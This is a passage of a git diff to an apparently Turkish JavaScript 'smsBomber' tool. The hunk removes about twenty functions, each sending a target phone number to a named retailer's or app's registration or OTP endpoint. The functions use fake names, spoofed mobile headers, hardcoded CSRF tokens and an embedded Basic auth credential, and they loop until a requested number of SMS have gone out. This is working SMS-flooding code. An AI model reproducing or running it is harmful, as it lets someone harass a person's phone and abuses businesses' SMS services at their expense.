@@ -15,1303 +15,2154 @@ async function smsBomber({ phone, amount }) {
                 success: 0,
                 error: 0,
             };
-
-            async function kigili(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: "https://www.kigili.com/users/registration/",
-                    form: {
-                        first_name: faker.name.firstName(),
-                        last_name: faker.name.lastName(),
-                        email: faker.internet.email(),
-                        phone: "0" + no,
-                        password: "nwejkfıower32",
-                        confirm: "true",
-                        kvkk: "true",
-                        next: "",
-                    },
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 202) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Kigili]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Kigili]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            async function kahvedunyasi(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: "https://core.kahvedunyasi.com/api/users/sms/send",
-                    form: {
-                        mobile_number: no,
-                        token_type: "register_token",
-                    },
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [KahveDünyası]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [KahveDünyası]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            async function wmf(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: "https://www.wmf.com.tr/users/register/",
-                    form: {
-                        confirm: "true",
-                        date_of_birth: "1956-03-01",
-                        email: faker.internet.email(),
-                        email_allowed: "true",
-                        first_name: faker.name.firstName(),
-                        gender: "male",
-                        last_name: faker.name.lastName(),
-                        password: "nwejkfıower32",
-                        phone: "0" + no,
-                    },
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 202) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [WMF]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [WMF]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            async function tiklagelsin(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request({
-                    url: "https://www.tiklagelsin.com/user/graphql",
-                    headers: {
-                        accept: "*/*",
-                        "accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
-                        "content-type": "application/json",
-                        "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
-                        "sec-ch-ua-mobile": "?0",
-                        "sec-ch-ua-platform": '"Windows"',
-                        "sec-fetch-dest": "empty",
-                        "sec-fetch-mode": "cors",
-                        "sec-fetch-site": "same-origin",
-                        "x-device-type": "3",
-                        "x-merchant-type": "0",
-                        "x-no-auth": "true",
-                        Referer: "https://www.tiklagelsin.com/a/",
-                        "Referrer-Policy": "strict-origin-when-cross-origin",
-                    },
-                    body: `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
-                    method: "POST",
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [TiklaGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [TiklaGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function bim(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://bim.veesk.net:443/service/v1.0/account/login',
-                    json: {
-                        "phone": no,
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Bim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Bim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function sok(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://api.ceptesok.com:443/api/users/sendsms',
-                    json: {
-                        "mobile_number": no,
-                        "token_type": "register_token"
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Sok]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Sok]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function migros(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
-                    json: {
-                        "phoneNumber": no,
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Migros]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Migros]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function a101(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://www.a101.com.tr:443/users/otp-login/',
-                    json: {
-                        "phone": "0"+no,
-                        "next": "/a101-kapida"
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [A101]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [A101]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function sakasu(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
-                    form: {
-                        "phone": "0"+no,
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Sakasu]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Sakasu]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });     
-            }
-            
-            function zarinplus(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://api.zarinplus.com/user/zarinpal-login',
-                    json: {
-                        "phone_number": "90"+no,
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [ZarinPlus]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [ZarinPlus]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function coregap(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: `https://core.gap.im/v1/user/add.json?mobile=90${no}`,
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [CoreGap]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [CoreGap]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function icq(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${no}&platform=ios&r=796356153&smsFormatType=human`,
-                    headers: {
-                        "Accept": "*/*",
-                        "Content-Type": "application/x-www-form-urlencoded", 
-                        "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", 
-                        "Accept-Language": "tr-TR,en;q=0.9", 
-                        "Accept-Encoding": "gzip, deflate"
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [ICQ]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [ICQ]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                }
-                });
-            }
-
-            function naosstars(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: `https://shop.naosstars.com/users/register/`,
-                    json: {
-                        "email": `${faker.internet.email()}`,
-                        "first_name": `${faker.name.firstName()}`,
-                        "last_name": `${faker.name.lastName()}`,
-                        "password": "nwejkDsOpOJıower32.",
-                        "date_of_birth": "1975-12-31",
-                        "phone": `0${no}`,
-                        "gender": "male",
-                        "kvkk": "true",
-                        "contact": "true",
-                        "confirm": "true"
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [NaosStars]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [NaosStars]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function rentiva(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: `https://rentiva.com:443/api/Account/Login`,
-                    headers: {
-                        "Accept": "application/json, text/plain, */*", 
-                        "Content-Type": "application/json", 
-                        "Origin": "ionic://localhost", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 
-                        "Accept-Language": "tr-TR,tr;q=0.9" 
-                    },
-                    json: {
-                        "appleId": null,
-                        "code": "", 
-                        "email": "", 
-                        "facebookId": null,
-                        "googleId": null,
-                        "lastName": "", 
-                        "name": "", 
-                        "phone": no,
-                        "type": 1
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Rentiva]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Rentiva]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            async function loncamarket(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://www.loncamarket.com/lid/identity/sendconfirmationcode',
-                    json: {
-                        "Address": no,
-                        "ConfirmationType": 0
-                    },
-                    headers: {
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", 
-                        "Accept": "application/json, text/javascript, */*; q=0.01", 
-                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", 
-                        "Accept-Encoding": "gzip, deflate", "Content-Type": 
-                        "application/json; charset=utf-8", 
-                        "X-Requested-With": "XMLHttpRequest", 
-                        "Origin": "https://www.loncamarket.com", 
-                        "Dnt": "1", 
-                        "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", 
-                        "Sec-Fetch-Dest": "empty", 
-                        "Sec-Fetch-Mode": "cors", 
-                        "Sec-Fetch-Site": "same-origin", 
-                        "Te": "trailers", 
-                        "Connection": "close"
-                    },
-                    verify: false,
-                    timeout: 3000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [LoncaMarket]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [LoncaMarket]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function kimgb(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp',
-                    json: {
-                        "msisdn": `90${no}`
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Kimgb]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Kimgb]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function tazi(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin',
-                    json: {
-                        "cep_tel": no,
-                        "cep_tel_ulkekod": "90",
-                    },
-                    headers: {
-                        "Accept": "application/json, text/plain, */*", 
-                        "Content-Type": "application/json;charset=utf-8", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", 
-                        "Accept-Language": "tr-TR,tr;q=0.9", 
-                        "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Tazi]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Tazi]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function evidea(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://www.evidea.com:443/users/register/',
-                    data: `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n${faker.internet.email()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0${no}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`,
-                    headers: {
-                        "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", 
-                        "X-Project-Name": "undefined", 
-                        "Accept": "application/json, text/plain, */*", 
-                        "X-App-Type": "akinon-mobile", 
-                        "X-Requested-With": "XMLHttpRequest", 
-                        "Accept-Language": "tr-TR,tr;q=0.9", 
-                        "Cache-Control": "no-store", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "X-App-Device": "ios", 
-                        "Referer": "https://www.evidea.com/", 
-                        "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", 
-                        "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Evidea]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Evidea]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function heyscooter(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: `https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${no}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9`,
-                    headers: {
-                        "Accept": "application/json, text/plain, */*", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
-                        "Accept-Language": "tr"
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [HeyScooter]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [HeyScooter]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function koton(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: `https://www.koton.com:443/users/register/`,
-                    headers: {
-                        "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", 
-                        "X-Project-Name": "rn-env", 
-                        "Accept": "application/json, text/plain, */*", 
-                        "X-App-Type": "akinon-mobile", 
-                        "X-Requested-With": "XMLHttpRequest", 
-                        "Accept-Language": "en-US,en;q=0.9", 
-                        "Cache-Control": "no-store", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "X-App-Device": "ios", "Referer": "https://www.koton.com/", 
-                        "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
-                        "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
-                    },
-                    data: `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n${faker.internet.email()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0${no}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`,
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Koton]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Koton]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function ipragaz(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp',
-                    headers: {
-                        "Content-Type": "application/json", 
-                        "X-Api-Token": "", 
-                        "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", 
-                        "Accept": "*/*", 
-                        "App-Name": "ipragaz-mobile", 
-                        "Os": "ios", 
-                        "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", 
-                        "App-Build": "41", "Os-Version": "15.7.7", 
-                        "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", 
